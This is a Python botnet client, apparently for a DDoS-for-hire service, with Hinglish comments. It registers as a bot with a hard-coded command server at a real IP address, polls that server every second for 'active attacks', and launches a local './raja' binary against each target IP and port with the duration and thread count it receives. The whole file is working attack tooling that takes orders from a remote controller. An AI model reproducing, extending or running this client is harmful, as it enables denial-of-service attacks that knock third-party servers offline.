import requests
import subprocess
import time
import json

BASE_URL = 'http://34.208.39.84:80'  # config.py ka server
API_KEY_FILE = 'api_key.txt'

# Track active attacks
active_tasks = {}

def load_or_get_api_key():
    """API key load kare ya naya generate kare"""
    try:
        with open(API_KEY_FILE, 'r') as f:
            api_key = f.read().strip()
            if api_key:
                print(f"[+] Loaded API key from {API_KEY_FILE}")
                return api_key
    except FileNotFoundError:
        pass
    
    # Naya API key generate kare
    username = f"bot_{int(time.time())}"
    try:
        response = requests.get(f'{BASE_URL}/register', params={'username': username})
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                api_key = data.get('api_key')
                with open(API_KEY_FILE, 'w') as f:
                    f.write(api_key)
                print(f"[+] Generated new API key: {api_key[:15]}...")
                return api_key
    except Exception as e:
        print(f"[!] Failed to generate API key: {e}")
    
    return None

def fetch_active_attacks(api_key):
    """Active attacks fetch kare config.py se"""
    try:
        # Add API key to headers or params
        headers = {'X-API-Key': api_key} if api_key else {}
        response = requests.get(f'{BASE_URL}/status', headers=headers)
        if response.status_code == 200:
            data = response.json()
            return data.get('attacks', [])
    except Exception as e:
        print(f"[!] Failed to fetch attacks: {e}")
    
    return []

def process_new_attack(attack_info):
    """Naya attack process kare aur raja binary run kare"""
    if not attack_info:
        return
    
    attack_id = attack_info.get('attack_id')
    target = attack_info.get('target', '')
    status = attack_info.get('status', '')
    
    if status != 'running':
        return
    
    if not target or ':' not in target:
        return
    
    # Target parse kare
    ip_port = target.split(':')
    if len(ip_port) != 2:
        return
    
    ip = ip_port[0]
    port = ip_port[1]
    
    # Get attack details directly from config.py's active_attacks
    # We need duration and threads for ./raja binary
    duration = 60  # default
    threads = 10   # default
    
    # Unique key for this task
    key = f"{ip}:{port}:{attack_id}"
    
    if key not in active_tasks:
        print(f"[+] New running attack: {target} (ID: {attack_id})")
        
        # Try to get more details
        try:
            # Request specific attack details
            headers = {'X-API-Key': api_key} if 'api_key' in globals() else {}
            details_response = requests.get(f'{BASE_URL}/status', 
                                          params={'attack_id': attack_id},
                                          headers=headers)
            if details_response.status_code == 200:
                details = details_response.json()
                duration = details.get('duration', 60)
                threads = details.get('threads', 10)
        except:
            pass
        
        # ./raja binary run kare
        try:
            # ./raja ip port duration threads
            cmd = ['./raja', ip, port, str(duration), str(threads)]
            process = subprocess.Popen(cmd)
            print(f"[+] Launched: ./raja {ip} {port} {duration} {threads} (PID: {process.pid})")
            
            # Track this task
            active_tasks[key] = {
                'process': process,
                'attack_id': attack_id,
                'ip': ip,
                'port': port,
                'duration': int(duration),
                'start_time': time.time(),
                'last_check': time.time()
            }
            
        except FileNotFoundError:
            print(f"[!] Error: ./raja binary not found!")
            print(f"[!] Make sure ./raja exists in current directory")
            print(f"[!] Run: chmod +x raja")
            time.sleep(10)
        except Exception as e:
            print(f"[!] Failed to launch ./raja: {e}")

def check_and_clean_tasks():
    """Check running tasks and clean completed ones"""
    current_time = time.time()
    tasks_to_remove = []
    
    for key, task in list(active_tasks.items()):
        process = task['process']
        
        # Check if process is still running
        if process.poll() is not None:  # Process finished
            print(f"[+] Process completed for {task['ip']}:{task['port']} (PID: {process.pid})")
            tasks_to_remove.append(key)
        # Check if duration has passed (with some buffer)
        elif current_time - task['start_time'] > task['duration'] + 5:
            print(f"[+] Duration expired for {task['ip']}:{task['port']}, terminating...")
            try:
                process.terminate()
                process.wait(timeout=3)
            except:
                process.kill()
            tasks_to_remove.append(key)
    
    # Remove completed/expired tasks
    for key in tasks_to_remove:
        if key in active_tasks:
            del active_tasks[key]
    
    return len(tasks_to_remove)

def main_loop():
    """Main monitoring loop"""
    print("[+] Starting soul.py for config.py")
    print(f"[+] Server: {BASE_URL}")
    print("[+] Will run ./raja binary for each active attack")
    
    # Get API key
    api_key = load_or_get_api_key()
    if not api_key:
        print("[!] No API key available. Exiting.")
        return
    
    print("[+] Starting monitoring loop...")
    print("[+] Checking for attacks every 5 seconds")
    print("-" * 50)
    
    check_interval = 1 # seconds between checks
    last_check = 0
    
    while True:
        try:
            current_time = time.time()
            
            # Check for new attacks every X seconds
            if current_time - last_check >= check_interval:
                # Fetch active attacks
                attacks = fetch_active_attacks(api_key)
                
                if attacks:
                    print(f"[{time.strftime('%H:%M:%S')}] Found {len(attacks)} active attack(s)")
                    
                    # Process each running attack
                    for attack in attacks:
                        process_new_attack(attack)
                else:
                    print(f"[{time.strftime('%H:%M:%S')}] No active attacks found")
                
                last_check = current_time
            
            # Check and clean completed tasks
            cleaned = check_and_clean_tasks()
            if cleaned > 0:
                print(f"[+] Cleaned {cleaned} completed task(s)")
            
            # Show active tasks status
            if active_tasks:
                print(f"[+] Currently running {len(active_tasks)} ./raja process(es)")
            
            time.sleep(1)
            
        except KeyboardInterrupt:
            print("\n[!] Stopping...")
            # Kill all running processes
            for key, task in active_tasks.items():
                try:
                    task['process'].terminate()
                except:
                    pass
            break
        except Exception as e:
            print(f"[!] Error in main loop: {e}")
            time.sleep(5)

if __name__ == '__main__':
    main_loop()